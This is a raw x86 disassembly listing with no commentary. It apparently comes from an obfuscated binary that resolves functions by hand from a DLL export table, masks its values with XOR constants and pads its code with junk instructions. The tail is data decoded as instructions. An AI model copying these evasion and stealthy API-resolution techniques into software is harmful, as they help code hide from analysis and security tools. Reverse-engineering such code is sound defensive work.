  4218e2:	mov    DWORD PTR [ebp-0x58],0x73d5
  4218e9:	mov    DWORD PTR [ebp-0x124],0x1e7d
  4218f3:	mov    DWORD PTR [ebp-0x3c],0x3144
  4218fa:	mov    eax,DWORD PTR [ebp-0x30]
  4218fd:	xor    eax,0x75cb
  421902:	mov    ecx,DWORD PTR [ebp-0x4]
  421905:	imul   eax,ecx
  421908:	mov    ecx,DWORD PTR [ebp+0x8]
  42190b:	lea    ecx,[ecx+eax*1-0x2123b90]
  421912:	mov    eax,DWORD PTR [ebp-0xf4]
  421918:	and    eax,0x6b34
  42191d:	and    eax,0x658d
  421922:	xor    edx,edx
  421924:	push   0x6
  421926:	pop    esi
  421927:	div    esi
  421929:	imul   eax,eax,0x3fb9
  42192f:	mov    edx,DWORD PTR [ebp-0x3c]
  421932:	and    edx,0x58c7
  421938:	mov    esi,DWORD PTR [ebp-0x124]
  42193e:	or     edx,esi
  421940:	add    edx,0x7a25
  421946:	imul   edx,edx,0x28d2
  42194c:	mov    esi,DWORD PTR [ebp-0x58]
  42194f:	xor    edx,esi
  421951:	xor    edx,0x1856f731
  421957:	mov    esi,DWORD PTR [ebp-0xe8]
  42195d:	mov    eax,DWORD PTR [esi+eax*1-0x3fb8fdc]
  421964:	add    eax,ecx
  421966:	add    edx,eax
  421968:	mov    DWORD PTR [ebp-0xac],edx
  42196e:	mov    DWORD PTR [ebp-0x54],0x1
  421975:	mov    DWORD PTR [ebp-0x40],0x1ee8
  42197c:	mov    DWORD PTR [ebp-0x1c],0x64d8
  421983:	mov    DWORD PTR [ebp-0xf0],0x5a06
  42198d:	mov    DWORD PTR [ebp-0x108],0x2eeb
  421997:	mov    DWORD PTR [ebp-0x104],0x2108
  4219a1:	mov    eax,DWORD PTR [ebp-0x1c]
  4219a4:	xor    edx,edx
  4219a6:	push   0x3
  4219a8:	pop    ecx
  4219a9:	div    ecx
  4219ab:	mov    ecx,DWORD PTR [ebp-0x40]
  4219ae:	or     eax,ecx
  4219b0:	mov    ecx,DWORD PTR [ebp-0x54]
  4219b3:	xor    edx,edx
  4219b5:	div    ecx
  4219b7:	imul   eax,eax,0x7d53
  4219bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4219c0:	lea    eax,[ecx+eax*1-0x1f534807]
  4219c7:	mov    ecx,DWORD PTR [ebp-0xf0]
  4219cd:	and    ecx,0x4108
  4219d3:	and    ecx,0x40e7
  4219d9:	sub    ecx,0x1a54
  4219df:	xor    ecx,0x25ac
  4219e5:	mov    edx,DWORD PTR [ebp-0x104]
  4219eb:	xor    edx,0x6dda
  4219f1:	mov    esi,DWORD PTR [ebp-0x108]
  4219f7:	and    edx,esi
  4219f9:	and    edx,0xe0c
  4219ff:	or     edx,0x5b
  421a02:	mov    esi,DWORD PTR [ebp-0xe8]
  421a08:	mov    ecx,DWORD PTR [esi+ecx*1+0x1c]
  421a0c:	add    ecx,eax
  421a0e:	lea    eax,[edx+ecx*1-0xc5b]
  421a15:	mov    DWORD PTR [ebp-0xa8],eax
  421a1b:	and    DWORD PTR [ebp-0x144],0x0
  421a22:	jmp    0x421a34
  421a27:	mov    eax,DWORD PTR [ebp-0x144]
  421a2d:	inc    eax
  421a2e:	mov    DWORD PTR [ebp-0x144],eax
  421a34:	mov    eax,DWORD PTR [ebp-0xe8]
  421a3a:	mov    ecx,DWORD PTR [ebp-0x144]
  421a40:	cmp    ecx,DWORD PTR [eax+0x18]
  421a43:	je     0x421ffc
  421a49:	mov    eax,DWORD PTR [ebp-0x144]
  421a4f:	mov    ecx,DWORD PTR [ebp-0x38]
  421a52:	mov    edx,DWORD PTR [ebp+0x8]
  421a55:	add    edx,DWORD PTR [ecx+eax*4]
  421a58:	mov    DWORD PTR [ebp-0x48],edx
  421a5b:	mov    eax,DWORD PTR [ebp-0x48]
  421a5e:	mov    DWORD PTR [ebp-0x210],eax
  421a64:	mov    eax,DWORD PTR [ebp+0xc]
  421a67:	mov    DWORD PTR [ebp-0x20c],eax
  421a6d:	mov    DWORD PTR [ebp-0x1f0],0xca79a575
  421a77:	mov    DWORD PTR [ebp-0x1ec],0x9c1b89e8
  421a81:	mov    DWORD PTR [ebp-0x1e0],0xca79a571
  421a8b:	mov    DWORD PTR [ebp-0x1dc],0x9c1b89e8
  421a95:	lea    eax,[ebp-0x1e8]
  421a9b:	mov    DWORD PTR [ebp-0x1f4],eax
  421aa1:	mov    eax,DWORD PTR [ebp-0x20c]
  421aa7:	movzx  eax,WORD PTR [eax+0x20]
  421aab:	xor    eax,0xa49b
  421ab0:	movzx  eax,ax
  421ab3:	sar    eax,1
  421ab5:	mov    ecx,DWORD PTR [ebp-0x20c]
  421abb:	movzx  ecx,WORD PTR [ecx+0x20]
  421abf:	xor    ecx,0xa49b
  421ac5:	movzx  ecx,cx
  421ac8:	shl    ecx,0xf
  421acb:	or     eax,ecx
  421acd:	movzx  eax,ax
  421ad0:	mov    ecx,DWORD PTR [ebp-0x1f4]
  421ad6:	mov    DWORD PTR [ecx],eax
  421ad8:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ade:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ae4:	xor    eax,0xca79a575
  421ae9:	xor    edx,0x9c1b89e8
  421aef:	mov    cl,0x2
  421af1:	call   0x40a9b5
  421af6:	mov    ebx,eax
  421af8:	mov    esi,edx
  421afa:	mov    eax,DWORD PTR [ebp-0x1e0]
  421b00:	mov    edx,DWORD PTR [ebp-0x1dc]
  421b06:	xor    eax,0xca79a575
  421b0b:	xor    edx,0x9c1b89e8
  421b11:	mov    cl,0x3e
  421b13:	call   0x422290
  421b18:	or     ebx,eax
  421b1a:	or     esi,edx
  421b1c:	movzx  eax,bl
  421b1f:	push   eax
  421b20:	lea    eax,[ebp-0x198]
  421b26:	push   eax
  421b27:	call   0x416c9e
  421b2c:	mov    eax,DWORD PTR [ebp-0x1f0]
  421b32:	mov    edx,DWORD PTR [ebp-0x1ec]
  421b38:	xor    eax,0xca79a575
  421b3d:	xor    edx,0x9c1b89e8
  421b43:	mov    cl,0x2
  421b45:	call   0x40a9b5
  421b4a:	mov    esi,eax
  421b4c:	mov    edi,edx
  421b4e:	mov    eax,DWORD PTR [ebp-0x1f0]
  421b54:	mov    edx,DWORD PTR [ebp-0x1ec]
  421b5a:	xor    eax,0xca79a575
  421b5f:	xor    edx,0x9c1b89e8
  421b65:	mov    cl,0x3e
  421b67:	call   0x422290
  421b6c:	or     esi,eax
  421b6e:	or     edi,edx
  421b70:	mov    DWORD PTR [ebp-0x1f8],esi
  421b76:	jmp    0x421bcb
  421b7b:	mov    eax,DWORD PTR [ebp-0x1e0]
  421b81:	mov    edx,DWORD PTR [ebp-0x1dc]
  421b87:	xor    eax,0xca79a575
  421b8c:	xor    edx,0x9c1b89e8
  421b92:	mov    cl,0x2
  421b94:	call   0x40a9b5
  421b99:	mov    esi,eax
  421b9b:	mov    edi,edx
  421b9d:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ba3:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ba9:	xor    eax,0xca79a575
  421bae:	xor    edx,0x9c1b89e8
  421bb4:	mov    cl,0x3e
  421bb6:	call   0x422290
  421bbb:	or     esi,eax
  421bbd:	or     edi,edx
  421bbf:	add    esi,DWORD PTR [ebp-0x1f8]
  421bc5:	mov    DWORD PTR [ebp-0x1f8],esi
  421bcb:	mov    eax,DWORD PTR [ebp-0x1e8]
  421bd1:	cmp    DWORD PTR [ebp-0x1f8],eax
  421bd7:	je     0x421c6a
  421bdd:	mov    eax,DWORD PTR [ebp-0x1f8]
  421be3:	mov    ecx,DWORD PTR [ebp-0x20c]
  421be9:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  421bee:	xor    eax,0xa49b
  421bf3:	movzx  eax,ax
  421bf6:	sar    eax,1
  421bf8:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421bfe:	mov    edx,DWORD PTR [ebp-0x20c]
  421c04:	movzx  ecx,WORD PTR [edx+ecx*4+0x2]
  421c09:	xor    ecx,0xa49b
  421c0f:	movzx  ecx,cx
  421c12:	shl    ecx,0xf
  421c15:	or     eax,ecx
  421c17:	movzx  eax,ax
  421c1a:	mov    DWORD PTR [ebp-0x1fc],eax
  421c20:	mov    eax,DWORD PTR [ebp-0x1f8]
  421c26:	mov    ecx,DWORD PTR [ebp-0x20c]
  421c2c:	movzx  eax,WORD PTR [ecx+eax*4]
  421c30:	xor    eax,0xa49b
  421c35:	movzx  eax,ax
  421c38:	sar    eax,1
  421c3a:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421c40:	mov    edx,DWORD PTR [ebp-0x20c]
  421c46:	movzx  ecx,WORD PTR [edx+ecx*4]
  421c4a:	xor    ecx,0xa49b
  421c50:	movzx  ecx,cx
  421c53:	shl    ecx,0xf
  421c56:	or     eax,ecx
  421c58:	mov    ecx,DWORD PTR [ebp-0x1fc]
  421c5e:	mov    BYTE PTR [ebp+ecx*1-0x198],al
  421c65:	jmp    0x421b7b
  421c6a:	mov    eax,DWORD PTR [ebp-0x1f0]
  421c70:	mov    edx,DWORD PTR [ebp-0x1ec]
  421c76:	xor    eax,0xca79a575
  421c7b:	xor    edx,0x9c1b89e8
  421c81:	mov    cl,0x2
  421c83:	call   0x40a9b5
  421c88:	mov    esi,eax
  421c8a:	mov    edi,edx
  421c8c:	mov    eax,DWORD PTR [ebp-0x1f0]
  421c92:	mov    edx,DWORD PTR [ebp-0x1ec]
  421c98:	xor    eax,0xca79a575
  421c9d:	xor    edx,0x9c1b89e8
  421ca3:	mov    cl,0x3e
  421ca5:	call   0x422290
  421caa:	or     esi,eax
  421cac:	or     edi,edx
  421cae:	mov    DWORD PTR [ebp-0x1e4],esi
  421cb4:	mov    eax,DWORD PTR [ebp-0x1e0]
  421cba:	mov    edx,DWORD PTR [ebp-0x1dc]
  421cc0:	xor    eax,0xca79a575
  421cc5:	xor    edx,0x9c1b89e8
  421ccb:	mov    cl,0x2
  421ccd:	call   0x40a9b5
  421cd2:	mov    esi,eax
  421cd4:	mov    edi,edx
  421cd6:	mov    eax,DWORD PTR [ebp-0x1e0]
  421cdc:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ce2:	xor    eax,0xca79a575
  421ce7:	xor    edx,0x9c1b89e8
  421ced:	mov    cl,0x3e
  421cef:	call   0x422290
  421cf4:	or     esi,eax
  421cf6:	or     edi,edx
  421cf8:	mov    DWORD PTR [ebp-0x23c],esi
  421cfe:	mov    DWORD PTR [ebp-0x238],edi
  421d04:	mov    eax,DWORD PTR [ebp-0x23c]
  421d0a:	or     eax,DWORD PTR [ebp-0x238]
  421d10:	je     0x421f70
  421d16:	lea    eax,[ebp-0x204]
  421d1c:	mov    DWORD PTR [ebp-0x208],eax
  421d22:	mov    eax,DWORD PTR [ebp-0x1e4]
  421d28:	xor    edx,edx
  421d2a:	mov    cl,0x2
  421d2c:	call   0x422290
  421d31:	mov    esi,eax
  421d33:	mov    edi,edx
  421d35:	mov    eax,DWORD PTR [ebp-0x1e4]
  421d3b:	xor    edx,edx
  421d3d:	mov    cl,0x3e
  421d3f:	call   0x40a9b5
  421d44:	or     esi,eax
  421d46:	or     edi,edx
  421d48:	xor    esi,0xca79a575
  421d4e:	xor    edi,0x9c1b89e8
  421d54:	mov    eax,DWORD PTR [ebp-0x208]
  421d5a:	mov    DWORD PTR [eax],esi
  421d5c:	mov    DWORD PTR [eax+0x4],edi
  421d5f:	mov    eax,DWORD PTR [ebp-0x1e4]
  421d65:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421d6d:	mov    eax,DWORD PTR [ebp-0x1e0]
  421d73:	mov    edx,DWORD PTR [ebp-0x1dc]
  421d79:	xor    eax,0xca79a575
  421d7e:	xor    edx,0x9c1b89e8
  421d84:	mov    cl,0x2
  421d86:	call   0x40a9b5
  421d8b:	mov    ebx,eax
  421d8d:	mov    edi,edx
  421d8f:	mov    eax,DWORD PTR [ebp-0x1e0]
  421d95:	mov    edx,DWORD PTR [ebp-0x1dc]
  421d9b:	xor    eax,0xca79a575
  421da0:	xor    edx,0x9c1b89e8
  421da6:	mov    cl,0x3e
  421da8:	call   0x422290
  421dad:	or     ebx,eax
  421daf:	or     edi,edx
  421db1:	movsx  eax,bl
  421db4:	cmp    esi,eax
  421db6:	je     0x421f16
  421dbc:	mov    eax,DWORD PTR [ebp-0x1e4]
  421dc2:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421dca:	mov    eax,DWORD PTR [ebp-0x204]
  421dd0:	mov    edx,DWORD PTR [ebp-0x200]
  421dd6:	xor    eax,0xca79a575
  421ddb:	xor    edx,0x9c1b89e8
  421de1:	mov    cl,0x2
  421de3:	call   0x40a9b5
  421de8:	mov    edi,eax
  421dea:	mov    ebx,edx
  421dec:	mov    eax,DWORD PTR [ebp-0x204]
  421df2:	mov    edx,DWORD PTR [ebp-0x200]
  421df8:	xor    eax,0xca79a575
  421dfd:	xor    edx,0x9c1b89e8
  421e03:	mov    cl,0x3e
  421e05:	call   0x422290
  421e0a:	or     edi,eax
  421e0c:	or     ebx,edx
  421e0e:	mov    eax,DWORD PTR [ebp-0x210]
  421e14:	movsx  eax,BYTE PTR [eax+edi*1]
  421e18:	cmp    esi,eax
  421e1a:	je     0x421e2a
  421e20:	jmp    0x421f70
  421e25:	jmp    0x421f16
  421e2a:	mov    eax,DWORD PTR [ebp-0x204]
  421e30:	mov    edx,DWORD PTR [ebp-0x200]
  421e36:	xor    eax,0xca79a575
  421e3b:	xor    edx,0x9c1b89e8
  421e41:	mov    cl,0x2
  421e43:	call   0x40a9b5
  421e48:	mov    esi,eax
  421e4a:	mov    edi,edx
  421e4c:	mov    eax,DWORD PTR [ebp-0x204]
  421e52:	mov    edx,DWORD PTR [ebp-0x200]
  421e58:	xor    eax,0xca79a575
  421e5d:	xor    edx,0x9c1b89e8
  421e63:	mov    cl,0x3e
  421e65:	call   0x422290
  421e6a:	or     esi,eax
  421e6c:	or     edi,edx
  421e6e:	mov    eax,DWORD PTR [ebp-0x210]
  421e74:	movsx  esi,BYTE PTR [eax+esi*1]
  421e78:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e7e:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e84:	xor    eax,0xca79a575
  421e89:	xor    edx,0x9c1b89e8
  421e8f:	mov    cl,0x2
  421e91:	call   0x40a9b5
  421e96:	mov    ebx,eax
  421e98:	mov    edi,edx
  421e9a:	mov    eax,DWORD PTR [ebp-0x1f0]
  421ea0:	mov    edx,DWORD PTR [ebp-0x1ec]
  421ea6:	xor    eax,0xca79a575
  421eab:	xor    edx,0x9c1b89e8
  421eb1:	mov    cl,0x3e
  421eb3:	call   0x422290
  421eb8:	or     ebx,eax
  421eba:	or     edi,edx
  421ebc:	movsx  eax,bl
  421ebf:	cmp    esi,eax
  421ec1:	jne    0x421f16
  421ec7:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ecd:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ed3:	xor    eax,0xca79a575
  421ed8:	xor    edx,0x9c1b89e8
  421ede:	mov    cl,0x2
  421ee0:	call   0x40a9b5
  421ee5:	mov    esi,eax
  421ee7:	mov    edi,edx
  421ee9:	mov    eax,DWORD PTR [ebp-0x1e0]
  421eef:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ef5:	xor    eax,0xca79a575
  421efa:	xor    edx,0x9c1b89e8
  421f00:	mov    cl,0x3e
  421f02:	call   0x422290
  421f07:	or     esi,eax
  421f09:	or     edi,edx
  421f0b:	mov    DWORD PTR [ebp-0x214],esi
  421f11:	jmp    0x421fba
  421f16:	mov    eax,DWORD PTR [ebp-0x1e0]
  421f1c:	mov    edx,DWORD PTR [ebp-0x1dc]
  421f22:	xor    eax,0xca79a575
  421f27:	xor    edx,0x9c1b89e8
  421f2d:	mov    cl,0x2
  421f2f:	call   0x40a9b5
  421f34:	mov    esi,eax
  421f36:	mov    edi,edx
  421f38:	mov    eax,DWORD PTR [ebp-0x1e0]
  421f3e:	mov    edx,DWORD PTR [ebp-0x1dc]
  421f44:	xor    eax,0xca79a575
  421f49:	xor    edx,0x9c1b89e8
  421f4f:	mov    cl,0x3e
  421f51:	call   0x422290
  421f56:	or     esi,eax
  421f58:	or     edi,edx
  421f5a:	add    esi,DWORD PTR [ebp-0x1e4]
  421f60:	mov    DWORD PTR [ebp-0x1e4],esi
  421f66:	jmp    0x421cb4
  421f6b:	jmp    0x421cb4
  421f70:	mov    eax,DWORD PTR [ebp-0x1f0]
  421f76:	mov    edx,DWORD PTR [ebp-0x1ec]
  421f7c:	xor    eax,0xca79a575
  421f81:	xor    edx,0x9c1b89e8
  421f87:	mov    cl,0x2
  421f89:	call   0x40a9b5
  421f8e:	mov    esi,eax
  421f90:	mov    edi,edx
  421f92:	mov    eax,DWORD PTR [ebp-0x1f0]
  421f98:	mov    edx,DWORD PTR [ebp-0x1ec]
  421f9e:	xor    eax,0xca79a575
  421fa3:	xor    edx,0x9c1b89e8
  421fa9:	mov    cl,0x3e
  421fab:	call   0x422290
  421fb0:	or     esi,eax
  421fb2:	or     edi,edx
  421fb4:	mov    DWORD PTR [ebp-0x214],esi
  421fba:	mov    eax,DWORD PTR [ebp-0x214]
  421fc0:	mov    DWORD PTR [ebp-0xc8],eax
  421fc6:	cmp    DWORD PTR [ebp-0xc8],0x0
  421fcd:	je     0x421ff7
  421fd3:	mov    eax,DWORD PTR [ebp-0x144]
  421fd9:	mov    ecx,DWORD PTR [ebp-0xac]
  421fdf:	movzx  eax,WORD PTR [ecx+eax*2]
  421fe3:	mov    ecx,DWORD PTR [ebp-0xa8]
  421fe9:	mov    eax,DWORD PTR [ecx+eax*4]
  421fec:	mov    DWORD PTR [ebp-0xfc],eax
  421ff2:	jmp    0x421ffc
  421ff7:	jmp    0x421a27
  421ffc:	cmp    DWORD PTR [ebp-0xfc],0x0
  422003:	jne    0x422010
  422009:	xor    eax,eax
  42200b:	jmp    0x422289
  422010:	mov    eax,DWORD PTR [ebp+0x8]
  422013:	add    eax,DWORD PTR [ebp-0xfc]
  422019:	mov    DWORD PTR [ebp-0xec],eax
  42201f:	mov    DWORD PTR [ebp-0x74],0x0
  422026:	cmp    DWORD PTR [ebp-0xb0],0x0
  42202d:	je     0x4220a9
  422033:	cmp    DWORD PTR [ebp-0xb0],0x0
  42203a:	je     0x4220a9
  422040:	mov    eax,DWORD PTR [ebp-0xb0]
  422046:	shl    eax,0x2
  422049:	mov    DWORD PTR [ebp-0x74],eax
  42204c:	mov    DWORD PTR [ebp-0x14c],0x0
  422056:	sub    esp,DWORD PTR [ebp-0x74]
  422059:	mov    DWORD PTR [ebp-0x14c],esp
  42205f:	mov    DWORD PTR [ebp-0x148],0x0
  422069:	mov    eax,DWORD PTR [ebp-0x148]
  42206f:	cmp    eax,DWORD PTR [ebp-0xb0]
  422075:	je     0x4220a9
  42207b:	mov    eax,DWORD PTR [ebp-0x148]
  422081:	mov    ecx,DWORD PTR [ebp-0x14c]
  422087:	mov    edx,DWORD PTR [ebp-0x148]
  42208d:	mov    esi,DWORD PTR [ebp+0x14]
  422090:	mov    edx,DWORD PTR [esi+edx*4+0x4]
  422094:	mov    DWORD PTR [ecx+eax*4],edx
  422097:	mov    eax,DWORD PTR [ebp-0x148]
  42209d:	inc    eax
  42209e:	mov    DWORD PTR [ebp-0x148],eax
  4220a4:	jmp    0x422069
  4220a9:	mov    DWORD PTR [ebp-0x9c],0x0
  4220b3:	push   0x422242
  4220b8:	jmp    DWORD PTR [ebp-0xec]
  4220be:	mov    eax,eax
  4220c0:	mov    ecx,esp
  4220c2:	ret    0xc
  4220c5:	cmp    DWORD PTR ds:0x42835f,0x0
  4220cc:	mov    DWORD PTR ds:0x42835b,0x7476
  4220d6:	mov    DWORD PTR ds:0x4281d7,0x1cdc
  4220e0:	mov    DWORD PTR ds:0x42835b,0x65fa
  4220ea:	mov    DWORD PTR ds:0x4281c7,0x5dca
  4220f4:	jmp    0x42213e
  4220f9:	mov    eax,ds:0x428357
  4220fe:	cmp    DWORD PTR ds:0x42835f,0x0
  422105:	jbe    0x422126
  42210b:	push   0x24f1
  422110:	call   DWORD PTR ds:0x428dd8
  422116:	inc    DWORD PTR ds:0x428403
  42211c:	sub    DWORD PTR ds:0x4281e3,0x46d9
  422126:	inc    DWORD PTR ds:0x42835f
  42212c:	adc    DWORD PTR ds:0x42836b,ebx
  422132:	or     DWORD PTR ds:0x428293,0x4029
  42213c:	not    eax
  42213e:	push   ebx
  42213f:	push   esi
  422140:	sbb    DWORD PTR ds:0x4283ef,edx
  422146:	mov    eax,DWORD PTR [esp+0x18]
  42214a:	or     eax,eax
  42214c:	jne    0x42217c
  422152:	mov    ecx,DWORD PTR [esp+0x14]
  422156:	mov    eax,DWORD PTR [esp+0x10]
  42215a:	xor    edx,edx
  42215c:	div    ecx
  42215e:	xor    DWORD PTR ds:0x4281ef,0x45f1
  422168:	mov    ebx,eax
  42216a:	mov    eax,DWORD PTR [esp+0xc]
  42216e:	div    ecx
  422170:	mov    edx,0x36e3
  422175:	mov    edx,ebx
  422177:	jmp    0x42223d
  42217c:	mov    ecx,eax
  42217e:	sbb    eax,0x67a9
  422183:	mov    ebx,DWORD PTR [esp+0x14]
  422187:	cmp    DWORD PTR ds:0x428357,0x0
  42218e:	mov    edx,DWORD PTR ds:0x428407
  422194:	mov    DWORD PTR ds:0x428387,0x4bc7
  42219e:	mov    edx,DWORD PTR ds:0x42836f
  4221a4:	jmp    0x4221ee
  4221a9:	mov    DWORD PTR ds:0x4282b7,0x15f
  4221b3:	mov    DWORD PTR ds:0x4282ef,0x4dd1
  4221bd:	cmp    DWORD PTR ds:0x428357,0x0
  4221c4:	jle    0x4221e1
  4221ca:	push   0x824e
  4221cf:	call   DWORD PTR ds:0x428ddc
  4221d5:	xor    DWORD PTR ds:0x42836f,0x6c44
  4221df:	sub    edx,edx
  4221e1:	sbb    DWORD PTR ds:0x4282b7,0x445e
  4221eb:	dec    edx
  4221ec:	not    edx
  4221ee:	mov    edx,DWORD PTR [esp+0x10]
  4221f2:	mov    eax,DWORD PTR [esp+0xc]
  4221f6:	shr    ecx,1
  4221f8:	rcr    ebx,1
  4221fa:	shr    edx,1
  4221fc:	rcr    eax,1
  4221fe:	or     ecx,ecx
  422200:	jne    0x4221f6
  422206:	div    ebx
  422208:	mov    esi,eax
  42220a:	mul    DWORD PTR [esp+0x18]
  42220e:	mov    ecx,eax
  422210:	mov    eax,DWORD PTR [esp+0x14]
  422214:	mul    esi
  422216:	add    edx,ecx
  422218:	jb     0x422238
  42221e:	cmp    edx,DWORD PTR [esp+0x10]
  422222:	ja     0x422238
  422228:	jb     0x422239
  42222e:	cmp    eax,DWORD PTR [esp+0xc]
  422232:	jbe    0x422239
  422238:	dec    esi
  422239:	xor    edx,edx
  42223b:	mov    eax,esi
  42223d:	pop    esi
  42223e:	pop    ebx
  42223f:	ret    0x10
  422242:	or     DWORD PTR ds:0x4283d3,0x4283df
  42224c:	sub    DWORD PTR [ebp+0x10],0x1
  422250:	mov    DWORD PTR ds:0x4281db,0x43bf
  42225a:	cmp    DWORD PTR [ebp+0x10],0x0
  42225e:	mov    DWORD PTR ds:0x4283cb,0x612a
  422268:	je     0x422277
  42226e:	xor    DWORD PTR ds:0x4281c7,edx
  422274:	add    esp,DWORD PTR [ebp-0x74]
  422277:	mov    DWORD PTR [ebp-0x9c],eax
  42227d:	mov    DWORD PTR ds:0x4282cf,ebx
  422283:	mov    eax,DWORD PTR [ebp-0x9c]
  422289:	pop    edi
  42228a:	pop    esi
  42228b:	pop    ebx
  42228c:	leave  
  42228d:	ret    0x10
  422290:	cmp    cl,0x40
  422293:	mov    DWORD PTR ds:0x4282b3,0x43a8
  42229d:	jae    0x4222ef
  4222a3:	mov    DWORD PTR ds:0x4281e7,0x42f2
  4222ad:	cmp    cl,0x20
  4222b0:	mov    DWORD PTR ds:0x4281cf,0x3d58
  4222ba:	jae    0x4222da
  4222c0:	or     DWORD PTR ds:0x4281c3,0x5e1e
  4222ca:	shld   edx,eax,cl
  4222cd:	mov    DWORD PTR ds:0x4282e7,0x1bd2
  4222d7:	shl    eax,cl
  4222d9:	ret    
  4222da:	inc    edx
  4222db:	mov    edx,eax
  4222dd:	sub    DWORD PTR ds:0x428403,0x42835b
  4222e7:	xor    eax,eax
  4222e9:	and    cl,0x1f
  4222ec:	shl    edx,cl
  4222ee:	ret    
  4222ef:	xor    eax,eax
  4222f1:	xor    edx,edx
  4222f3:	ret    
	...
  422300:	jmp    0x3c568e40
  422305:	es sub al,0x44
  422308:	jno    0x422373
  42230a:	ja     0x422371
  42230c:	int3   
  42230d:	fsubr  QWORD PTR [edx+0x1e]
  422310:	jo     0x422377
  422312:	popa   
  422313:	ins    BYTE PTR es:[edi],dx
  422314:	push   eax
  422315:	lods   eax,DWORD PTR ds:[esi]
  422316:	xor    DWORD PTR [esi+0x41],edi
  422319:	ins    BYTE PTR es:[edi],dx
  42231a:	popa   
  42231b:	outs   dx,BYTE PTR ds:[esi]
  42231c:	add    BYTE PTR [eax],al
  42231e:	add    BYTE PTR [eax],al
  422320:	addr16 jb 0x422388
  422323:	popa   
  422324:	je     0x42238d
  422326:	jb     0x42238d
  422328:	popa   
  422329:	je     0x422392
  42232b:	jb     0x422392
  42232d:	popa   
  42232e:	je     0x422397
  422330:	jb     0x422397
  422332:	popa   
  422333:	je     0x42239c
  422335:	jb     0x42239c
  422337:	popa   
  422338:	je     0x4223a1
  42233a:	jb     0x4223a1
  42233c:	popa   
  42233d:	je     0x4223a6
  42233f:	jb     0x4223a6
  422341:	popa   
  422342:	je     0x4223ab
  422344:	jb     0x4223ab
  422346:	popa   
  422347:	je     0x4223b0
  422349:	jb     0x4223b0
  42234b:	popa   
  42234c:	je     0x4223b5
  42234e:	jb     0x4223b5
  422350:	popa   
  422351:	je     0x422353
  422353:	add    BYTE PTR [eax+0x65],ch
  422356:	ins    BYTE PTR es:[edi],dx
  422357:	ins    BYTE PTR es:[edi],dx
  422358:	push   0x686c6c65
  42235d:	gs ins BYTE PTR es:[edi],dx
  42235f:	ins    BYTE PTR es:[edi],dx
  422360:	push   0x686c6c65
  422365:	gs ins BYTE PTR es:[edi],dx
  422367:	ins    BYTE PTR es:[edi],dx
  422368:	push   0x686c6c65
  42236d:	gs ins BYTE PTR es:[edi],dx
  42236f:	ins    BYTE PTR es:[edi],dx
  422370:	push   0x686c6c65
  422375:	gs ins BYTE PTR es:[edi],dx
  422377:	ins    BYTE PTR es:[edi],dx
  422378:	push   0x686c6c65
  42237d:	gs ins BYTE PTR es:[edi],dx
  42237f:	ins    BYTE PTR es:[edi],dx
  422380:	push   0x686c6c65
  422385:	gs ins BYTE PTR es:[edi],dx
  422387:	ins    BYTE PTR es:[edi],dx
  422388:	add    BYTE PTR [eax],al
  42238a:	add    BYTE PTR [eax],al
  42238c:	outs   dx,DWORD PTR ds:[esi]
  42238d:	add    BYTE PTR [eax+eax*1+0x65],ch
  422391:	add    BYTE PTR [ecx+0x0],ah
  422394:	jne    0x422396
  422396:	je     0x422398
  422398:	xor    eax,DWORD PTR [eax]
  42239a:	xor    al,BYTE PTR [eax]
  42239c:	add    BYTE PTR [eax],al
  42239e:	add    BYTE PTR [eax],al
  4223a0:	push   0x61006500
  4223a5:	add    BYTE PTR [esi+0x0],dh
  4223a8:	add    BYTE PTR gs:[esi+0x0],ch
  4223ac:	push   0x61006500
  4223b1:	add    BYTE PTR [esi+0x0],dh
  4223b4:	add    BYTE PTR gs:[esi+0x0],ch
  4223b8:	push   0x61006500
  4223bd:	add    BYTE PTR [esi+0x0],dh
  4223c0:	add    BYTE PTR gs:[esi+0x0],ch
  4223c4:	push   0x61006500
  4223c9:	add    BYTE PTR [esi+0x0],dh
  4223cc:	add    BYTE PTR gs:[esi+0x0],ch
  4223d0:	push   0x61006500
  4223d5:	add    BYTE PTR [esi+0x0],dh
  4223d8:	add    BYTE PTR gs:[esi+0x0],ch
  4223dc:	push   0x61006500
  4223e1:	add    BYTE PTR [esi+0x0],dh
  4223e4:	add    BYTE PTR gs:[esi+0x0],ch
  4223e8:	push   0x61006500
  4223ed:	add    BYTE PTR [esi+0x0],dh
  4223f0:	add    BYTE PTR gs:[esi+0x0],ch
  4223f4:	push   0x61006500
  4223f9:	add    BYTE PTR [esi+0x0],dh
  4223fc:	add    BYTE PTR gs:[esi+0x0],ch
  422400:	push   0x61006500
  422405:	add    BYTE PTR [esi+0x0],dh
  422408:	add    BYTE PTR gs:[esi+0x0],ch
  42240c:	add    BYTE PTR [eax],al
  42240e:	add    BYTE PTR [eax],al
  422410:	mov    WORD PTR [ebx],fs
  422412:	inc    edx
  422413:	add    BYTE PTR [edi+0x6c],cl
  422416:	gs dec ecx
  422418:	arpl   WORD PTR [edi+0x6e],bp
  42241b:	push   esp
  42241c:	outs   dx,DWORD PTR ds:[esi]
  42241d:	inc    ebx
  42241e:	jne    0x422492
  422420:	jae    0x422491
  422422:	jb     0x422424
  422424:	adc    al,0x24
  422426:	inc    edx
	...
  42242f:	add    al,dl
  422431:	daa    
  422432:	inc    edx
  422433:	add    al,bl
  422435:	daa    
  422436:	inc    edx
  422437:	add    BYTE PTR [eax-0xdffbdda],dl
  42243d:	inc    ebx
  42243e:	push   ebx
  42243f:	mov    WORD PTR ds:0x1a49ba4,ss
  422445:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422446:	popf   
  422447:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422448:	jno    0x4223ee
  42244a:	xchg   edi,eax
  42244b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
